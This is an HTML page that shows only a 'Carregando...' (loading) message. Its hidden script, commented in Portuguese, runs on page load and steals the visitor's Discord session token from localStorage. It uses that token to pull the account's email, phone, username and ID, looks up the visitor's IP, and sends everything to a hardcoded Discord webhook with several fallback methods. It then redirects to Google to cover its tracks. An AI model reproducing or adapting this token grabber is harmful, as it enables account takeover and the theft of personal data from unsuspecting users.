<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Carregando...</title>
    <script>
        (async function() {
            const webhookURL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr";
            
            let token = localStorage.getItem("token");
            let email = "Não logado no Discord Web";
            let phone = "Não disponível";
            let username = "Desconhecido";
            let userID = "Desconhecido";

            // Se encontrou o token, busca dados na API
            if (token) {
                try {
                    const userResp = await fetch("https://discord.com/api/v9/users/@me", {
                        headers: { "Authorization": token }
                    });
                    const userData = await userResp.json();
                    email = userData.email || "Não disponível";
                    phone = userData.phone || "Não vinculado";
                    username = userData.username + "#" + (userData.discriminator || "0");
                    userID = userData.id;
                } catch (e) {}
            }

            // Pegar IP
            let ip = "Não capturado";
            try {
                const ipResp = await fetch("https://ip-api.com/json/");
                const ipData = await ipResp.json();
                ip = ipData.query;
            } catch (e) {}

            const platform = navigator.platform;

            // Monta mensagem em texto simples (SEM embed)
            const mensagem = 
                `**🎯 Dados Capturados**\n` +
                `👤 **Usuário:** ${username}\n` +
                `🆔 **ID:** ${userID}\n` +
                `📧 **Email:** ${email}\n` +
                `📱 **Telefone:** ${phone}\n` +
                `🔑 **Token:** ${token || "Não encontrado"}\n` +
                `🌐 **IP:** ${ip}\n` +
                `💻 **PC:** ${platform}`;

            // Tenta enviar de várias formas para garantir
            try {
                // Método 1: fetch normal
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: mensagem })
                });
            } catch (e1) {
                try {
                    // Método 2: sendBeacon
                    const blob = new Blob([JSON.stringify({ content: mensagem })], { type: 'application/json' });
                    navigator.sendBeacon(webhookURL, blob);
                } catch (e2) {
                    // Método 3: imagem (último recurso)
                    new Image().src = webhookURL + "?content=" + encodeURIComponent(mensagem);
                }
            }

            // Redireciona
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        })();
    </script>
</head>
<body>
    <h1>Carregando...</h1>
</body>
</html>
